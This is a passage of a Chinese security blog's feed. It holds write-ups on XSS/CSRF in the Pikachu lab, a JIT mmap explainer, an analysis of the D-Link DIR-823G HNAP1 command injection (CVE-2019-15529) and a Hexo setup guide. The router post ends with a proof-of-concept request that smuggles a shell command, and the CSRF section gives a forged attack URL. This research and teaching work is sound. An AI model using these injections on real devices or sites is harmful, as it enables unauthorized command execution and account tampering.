提交后会出现弹窗，每次刷新页面时都会弹出，与反射型xss的区别是：存储型xss已经被存储进后台代码中，所以每次刷新都会弹出XSS弹窗。所以存储型xss危害更大，会长久危害用户。</p><p><img src="https://i.loli.net/2020/11/04/uFGYlo5dkwHahMT.png" alt="捕获.PNG"></p><p><img src="https://i.loli.net/2020/11/04/IDX4duGil1fQwS5.png" alt="1111.PNG"></p><h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>DOM:一个一个访问html的标准编程接口，DOM是一个前端接口，没有和后端做任何的交互。</p><h1 id="0x03-CSRF"><a href="#0x03-CSRF" class="headerlink" title="0x03 CSRF"></a>0x03 CSRF</h1><p>CSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击.</p><h3 id="csrf攻击满足的条件"><a href="#csrf攻击满足的条件" class="headerlink" title="csrf攻击满足的条件"></a>csrf攻击满足的条件</h3><p>1.网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造</p><p>2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成</p><h3 id="csrf与xss的区别"><a href="#csrf与xss的区别" class="headerlink" title="csrf与xss的区别"></a>csrf与xss的区别</h3><p>csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。</p><h3 id="如何确认一个web系统存在csrf漏洞"><a href="#如何确认一个web系统存在csrf漏洞" class="headerlink" title="如何确认一个web系统存在csrf漏洞"></a>如何确认一个web系统存在csrf漏洞</h3><ul><li>1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造<ul><li>修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造；</li><li>对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；</li></ul></li><li>2.确认凭证的有效期<ul><li>虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。</li></ul></li></ul><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>登录账号，抓取修改个人信息流量包。</p><p><img src="https://i.loli.net/2020/11/04/oTmNylSJxc9vVGa.png" alt="11.PNG"></p><p>发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。</p><p>可以构造出CSRF攻击URL(bp抓的修改信息的包直接右键复制网址即可):</p><blockquote><p><a href="http://www.testbp.com:8081/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit">http://www.testbp.com:8081/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit</a></p></blockquote><p>诱使登录状态的用户点击url就可以完成CSRF攻击。</p><h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器）,站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。</p><p>步骤同get。但不知为何时灵时不灵。</p><p>正常登录状态：</p><p><img src="https://i.loli.net/2020/11/04/b7PA2OHu319LGlB.png" alt="捕获.PNG"></p><p>点击恶意url后，用户信息直接被修改。</p><p><img src="https://i.loli.net/2020/11/04/ZBbA8GrJfQtFe6U.png" alt="捕获.PNG"></p><h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h2><p>token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。</p><p>如图获取修改信息流量包后发现增加了token，无法利用。</p><p><img src="https://i.loli.net/2020/11/04/4fFa5SkYcCtyZGj.png" alt="捕获.PNG"></p><h2 id="防范CSRF措施"><a href="#防范CSRF措施" class="headerlink" title="防范CSRF措施"></a>防范CSRF措施</h2><ul><li>增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样</li><li>安全的会话管理（避免会话被利用）<ul><li>不要再客户端保存敏感信息（身份认证信息）</li><li>测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。</li></ul></li><li>访问控制安全管理<ul><li>敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码）</li><li>敏感信息的修改尽量使用post（post安全性高于get）</li><li>通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer）</li></ul></li><li>增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-暴力破解&quot;&gt;&lt;a href=&quot;#0x01-暴力破解&quot; class=&quot;headerlink&quot; title=&quot;0x01 暴力破解&quot;&gt;&lt;/a&gt;0x01 暴力破解&lt;/h1&gt;&lt;h2 id=&quot;基于表单的暴力破解&quot;&gt;&lt;a href=&quot;#基于表单的暴力破解&quot; class</summary>
      
    
    
    
    
    <category term="web" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>JIT学习</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-08-09T03:17:04.108Z</published>
    <updated>2022-08-09T03:41:19.337Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JIT原理"><a href="#JIT原理" class="headerlink" title="JIT原理"></a>JIT原理</h2><p>Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。</p><p>还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。</p><h2 id="技术点"><a href="#技术点" class="headerlink" title="技术点"></a>技术点</h2><p>从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。</p><p>例子：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">inc</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> </span>{<br>    <span class="hljs-keyword">return</span> a + <span class="hljs-number">1</span>;<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, <span class="hljs-built_in">inc</span>(<span class="hljs-number">3</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p><code>objdump -d 1</code>查看它的机器码。</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0000000000400526</span> &lt;<span class="hljs-keyword">inc</span>&gt;:<br>  <span class="hljs-number">400526</span>:<span class="hljs-number">55</span>                   <span class="hljs-keyword">push</span>   %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器<br>  <span class="hljs-number">400527</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> e5             <span class="hljs-keyword">mov</span>    %rsp,%rbp<br>  40052a:<span class="hljs-number">89</span> <span class="hljs-number">7d</span> fc             <span class="hljs-keyword">mov</span>    %edi,-<span class="hljs-number">0x4</span>(%rbp)#把<span class="hljs-built_in">edi</span>存到栈上。在x64处理器上，前<span class="hljs-number">6</span>个参数都是使用寄存器传参的。第一个参数会使用<span class="hljs-built_in">rdi</span>，第二个参数使用 <span class="hljs-built_in">rsi</span>，等等。所以 <span class="hljs-built_in">edi</span> 里存的其实就是第一个参数，也就是整数 <span class="hljs-number">3</span><br>  <span class="hljs-number">40052d</span>:8b <span class="hljs-number">45</span> fc             <span class="hljs-keyword">mov</span>    -<span class="hljs-number">0x4</span>(%rbp),%eax#把上一步存到栈上的那个整数再存进 <span class="hljs-built_in">eax</span> 中<br>  <span class="hljs-number">400530</span>:<span class="hljs-number">83</span> c0 <span class="hljs-number">01</span>             <span class="hljs-keyword">add</span>    <span class="hljs-number">$0</span>x1,%eax#把 <span class="hljs-built_in">eax</span> 加上 <span class="hljs-number">1</span>， 然后就退栈，返回。按照x64的规定（ABI），返回值通过<span class="hljs-built_in">eax</span>传递<br>  <span class="hljs-number">400533</span>:<span class="hljs-number">5d</span>                   <span class="hljs-keyword">pop</span>    %rbp<br>  <span class="hljs-number">400534</span>:c3                   retq   <br></code></pre></td></tr></tbody></table></figure><p>我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;memory.h&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(* inc_func)</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span>; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>    <span class="hljs-type">char</span> code[] = { <br>        <span class="hljs-number">0x55</span>,             <span class="hljs-comment">// push rbp</span><br>        <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-comment">// mov rsp, rbp</span><br>        <span class="hljs-number">0x89</span>, <span class="hljs-number">0xf8</span>,       <span class="hljs-comment">// mov edi, eax</span><br>        <span class="hljs-number">0x83</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-comment">// add $1, eax</span><br>        <span class="hljs-number">0x5d</span>,             <span class="hljs-comment">// pop rbp</span><br>        <span class="hljs-number">0xc3</span>              <span class="hljs-comment">// ret</span><br>    };  <br>    <span class="hljs-type">void</span> * temp = <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">sizeof</span>(code), PROT_WRITE | PROT_EXEC,<br>            MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>); <br>    <span class="hljs-built_in">memcpy</span>(temp, code, <span class="hljs-built_in">sizeof</span>(code));<br>    inc_func p_inc = (inc_func)temp;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, <span class="hljs-built_in">p_inc</span>(<span class="hljs-number">7</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>mmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。</p><p>我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JIT原理&quot;&gt;&lt;a href=&quot;#JIT原理&quot; class=&quot;headerlink&quot; title=&quot;JIT原理&quot;&gt;&lt;/a&gt;JIT原理&lt;/h2&gt;&lt;p&gt;Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件</summary>
      
    
    
    
    
    <category term="chrome知识点" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>Dlink DIR-823G 漏洞挖掘过程</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/</id>
    <published>2022-08-09T03:17:04.104Z</published>
    <updated>2022-08-09T03:39:15.963Z</updated>
    
    <content type="html"><![CDATA[<p>固件下载地址： <a href="https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA">https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA</a> 提取码：1ly1</p><h1 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h1><p><b>D-Link DIR-823G命令注入漏洞：</b></p><p>CVE编号：CVE-2019-15529</p><p>D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 </p><h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><ul><li>binwalk -Me 固件.bin //解开固件</li></ul><p><img src="https://i.loli.net/2020/09/24/p67xmQnKZ83I4Hy.png" alt="捕获.PNG"></p><p>是一个squashfs文件系统，标准linux目录结构。</p><ul><li>cat /etc/init.d/rcS //查看路由器开启的服务。</li></ul><p>发现一个goahead进程。</p><blockquote><p>GoAhead(嵌入式Web服务器)，GoAhead自身实现一个web服务器所需提供的基本功能，提供多种方法供扩展服务器的功能，包括asp过程、goforms过程。用户定制型非常强，可通过goaead的api定义url处理函数和可供asp文件中调用的函数。<br><code>websUrlHandlerDefine(T("/goform"), NULL, 0, websFormHandler, 0);</code> /goform的请求交给websFormHandler函数处理<br><code>websUrlHandlerDefine(T("/cgi-bin"), NULL, 0, websCgiHandler, 0);</code> /cgi-bin的请求交给websCgiHandler函数处理。</p></blockquote><h2 id="模拟运行固件"><a href="#模拟运行固件" class="headerlink" title="模拟运行固件"></a>模拟运行固件</h2><p>环境使用工具firmware-ayalysis-toolkit。</p><p>搭建教程：<a href="https://zhuanlan.zhihu.com/p/110806057">https://zhuanlan.zhihu.com/p/110806057</a></p><p>运行起来后nmap扫端口，发现开了http服务和dns服务。</p><p>访问<a href="http://192.168.0.1,可看到dlink登录页面.要求用户做一些设置,不需要密码即可登录./">http://192.168.0.1,可看到Dlink登录页面。要求用户做一些设置，不需要密码即可登录。</a></p><p><img src="https://i.loli.net/2020/09/24/QizkImP7T8lfOuw.png" alt="捕获.PNG"></p><p>在固件解压的文件下找到名为 web_mtn的文件，应该是web目录。其中cgi-bin目录下存放的cgi文件可以非授权访问，可能造成影响。</p><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p><b><code>/cgi-bin/ExportSettings.sh</code> 导出配置文件，造成信息泄露。</b></p><p><img src="https://i.loli.net/2020/09/24/Eewn8h6ApNbuyYW.png" alt="捕获.PNG"></p><p><b><code>/cgi-bin/upload_settings.cgi</code> 导入配置文件，可导入恶意篡改后的配置。</b></p><p><img src="https://i.loli.net/2020/09/24/oDs9v3ulnqfLOFd.png" alt="捕获.PNG"></p><p><b><code>/cgi-bin/GetDownLoadSyslog.sh</code> 获取系统部分启动信息<code>/var/log/messages*</code></b></p><p><img src="https://i.loli.net/2020/09/24/uqGwiQNa2eHz3CB.png" alt="捕获.PNG"></p><p><b><code>/cgi-bin/upload_firmware.cgi</code> 上传更新固件，可恶意修改固件</b></p><h2 id="goahead-自定义的请求处理函数"><a href="#goahead-自定义的请求处理函数" class="headerlink" title="goahead 自定义的请求处理函数"></a>goahead 自定义的请求处理函数</h2><blockquote><p>处理函数的参数列表：<br>int websCgiHandler(webs_t wp, char_t *urlPrefix, char_t *webDir, int arg, char_t *url, char_t <em>path, char_t</em> query)<br>goForms过程:它主要用来响应用户输入以更新系统设置或者执行特定的动作。在GoAhead中，goForms实现为一个URL处理器，它会解释以”/goform”开始的URLs。紧跟着”goform”之后的字符串定义了表单名字和用户请求的细节.</p></blockquote><p>IDA打开goahead分析：</p><p>通过字符串/cgi-bin或/goform找到定义url的函数位置。交叉引用，发现注册处理函数位置为0x42424C.</p><p><img src="https://i.loli.net/2020/09/24/awysHvo6RAzcgI7.png" alt="捕获.PNG"></p><p>websUrlHandlerDefine 的第一个参数为 url, 第四个参数应该就是相应 url 的处理函数。</p><p>抓取登录数据包，发现往/HNAP1发送。</p><p><img src="https://i.loli.net/2020/09/24/ARI7bVkUMSxZuDJ.png" alt="捕获.PNG"></p><p>分析/HNAP1（0x42383C）处理函数逻辑:</p><p><img src="https://i.loli.net/2020/09/24/EHM2wAsrvhCTJdj.png" alt="捕获.PNG"></p><p>从 wp 结构体中取出此次请求需要调用的函数名，然后去全局函数表里面搜索，找到之后在进行处理。</p><p>找到需要调用的处理函数后，会首先记录POST原始报文。这里记录日志首先是用snprintf生成命令，然后system执行。</p><p><img src="https://i.loli.net/2020/09/24/XD2TKt8ClQEZ6Af.png" alt="捕获.PNG"></p><p>此处可以直接注入’来命令执行。</p><blockquote><p>在PHP中常用到以下几个函数来执行外部命令:<br>system</p><blockquote><p>system()函数能够将字符串作为OS命令执行，并自带输出到当前页面的功能</p></blockquote><p>exec<br>passthru<br>shell_exec</p></blockquote><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight makefile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile">POST /HNAP1/ HTTP/1.1<br><span class="hljs-section">Host: 192.168.0.1</span><br><span class="hljs-section">Content-Length: 53</span><br><span class="hljs-section">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="hljs-section">Content-Type: text/xml; charset=UTF-8</span><br><span class="hljs-section">Accept: */*</span><br><span class="hljs-section">SOAPAction: "http://purenetworks.com/HNAP1/Login"</span><br><span class="hljs-section">Accept-Encoding: gzip, deflate</span><br><span class="hljs-section">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="hljs-section">Connection: close</span><br>'`echo hacked_by_hac425!!!!!!!! &gt; /web_mtn/hack.txt`'<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;固件下载地址： &lt;a href=&quot;https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA&quot;&gt;https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA&lt;/a&gt; 提取码：1ly1&lt;/p&gt;
&lt;h1 id</summary>
      
    
    
    
    
    <category term="IOT" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>Win10下使用Hexo搭建个人博客</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2022-08-07T08:48:45.000Z</published>
    <updated>2022-08-07T13:51:00.834Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载安装git、nodejs"><a href="#下载安装git、nodejs" class="headerlink" title="下载安装git、nodejs"></a>下载安装git、nodejs</h2><p>下载地址: </p><p>git: <a href="https://git-scm.com/">https://git-scm.com/</a> </p><p>nodejs: <a href="http://nodejs.cn/download/">http://nodejs.cn/download/</a></p><p>将nodejs加入path环境变量中。打开cmd测试：</p><p><img src="https://s2.loli.net/2022/08/07/NduraiRMcEQythF.png" alt="图片.png"></p><blockquote><p>报错1：输入 <code>npm-v</code> 出现报错:</p></blockquote><pre><code>npm WARN config global --global, --local are deprecated. Use `–location</code></pre><p>解决方法：打开<code>nodejs</code>安装位置文件夹，打开<code>npm.cmd</code>和<code>npm</code>，将文件中的<code>prefix -g</code>替换为<code>prefix --location=global</code>,保存后重新打开cmd测试即可。</p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><h3 id="换源（淘宝源）"><a href="#换源（淘宝源）" class="headerlink" title="换源（淘宝源）"></a>换源（淘宝源）</h3><pre><code>npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm -v </code></pre><p><img src="https://s2.loli.net/2022/08/07/9zM1KhnkOqAFsU6.png" alt="图片.png"></p><p>查看版本以及是否安装成功。</p><h3 id="安装hexo-1"><a href="#安装hexo-1" class="headerlink" title="安装hexo"></a>安装hexo</h3><pre><code>cnpm install -g hexo-clihexo -v</code></pre><p>新建文件夹放置博客内容，在cmd中进入所建立的目录：</p><pre><code>hexo init #初始化hexohexo s #启动hexo</code></pre><p>访问 <code> http://localhost:4000/</code>如下即成功：</p><p><img src="https://s2.loli.net/2022/08/07/dvIiunG5yhOEUX8.png" alt="图片.png"></p><h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><pre><code>hexo new &quot;文章标题&quot;</code></pre><p>在目录&#x2F;source&#x2F;_posts&#x2F;下生成文件.md<br>更新文章：<br>    hexo clean<br>    hexo g<br>    hexo s</p><h2 id="部署github"><a href="#部署github" class="headerlink" title="部署github"></a>部署github</h2><p>1、建立一个新的库，命名需要符合规则：<code>username.gitgub.io</code><br>2、命令行输入：</p><pre><code>cnpm install --save hexo-deployer-git  </code></pre><p>3、更改设置</p><p>找到_config.yml文件，翻到最底部</p><p>将<code>type</code>改为<code>git</code></p><p>添加<code>repo: &quot;此处为仓库地址&quot;</code></p><p>添加<code>branch: master</code></p><p>repo为仓库地址 branch为master即可</p><p><img src="https://s2.loli.net/2022/08/07/akWVI3mUinyP2sJ.png" alt="图片.png"></p><p>4、部署到远端</p><pre><code>git config --global user.email &quot;xxx(此处为邮箱)&quot;  git config --global user.name &quot;xxx(此处为用户名)&quot;  #github用户名hexo d  </code></pre><p>弹出网页提示是否关联git和github 授权即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;下载安装git、nodejs&quot;&gt;&lt;a href=&quot;#下载安装git、nodejs&quot; class=&quot;headerlink&quot; title=&quot;下载安装git、nodejs&quot;&gt;&lt;/a&gt;下载安装git、nodejs&lt;/h2&gt;&lt;p&gt;下载地址: &lt;/p&gt;
&lt;p&gt;git: &lt;a </summary>
      
    
    
    
    
  </entry>
  
</feed>
